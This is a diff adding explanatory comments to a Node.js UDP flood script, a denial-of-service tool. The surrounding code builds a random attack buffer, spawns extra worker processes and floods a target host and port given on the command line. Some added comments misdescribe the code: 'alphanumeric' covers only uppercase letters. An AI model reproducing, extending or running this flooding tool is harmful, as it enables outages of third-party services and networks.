@@ -16,11 +16,11 @@ function errorHandler() {
 function randStr(size) {
     let buffer = [];
     for (let b = 0; b < size; b++) {
-      buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65);
+      buffer[b] = String.fromCharCode(Math.floor(Math.random() * 26) + 65); // Randomize between alphanumeric characters only.
     } return buffer.join('');
 }
 
-// generate the random alphanum string to send.
+// generate our buffer to send only once per thread.
 const attackBuffer = randStr(parseInt(process.argv[4]));
 
 function udpFlood(host, port, length) {
@@ -32,6 +32,7 @@ function udpFlood(host, port, length) {
 }
 
 if (cluster.isPrimary) {
+    // Main thread begins here. (Initial thread).
     if (process.argv.length < 6) {
         console.log(`Usage: node ${process.argv[1]} [host] [port, (0 for random)] [size, (0 for random)] [time] [extra-threads]`);
         process.exit(1);
@@ -53,6 +54,7 @@ if (cluster.isPrimary) {
     });
     errorHandler();
 } else {
+    // everything to be threaded. (Each thread will contain different random information.)
     process.argv[3] = process.argv[3] == 0 ? Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024 : process.argv[3];
     process.argv[4] = process.argv[4] == 0 ? Math.floor(Math.random() * (1428 - 1024 + 1)) + 5 : process.argv[4];
 
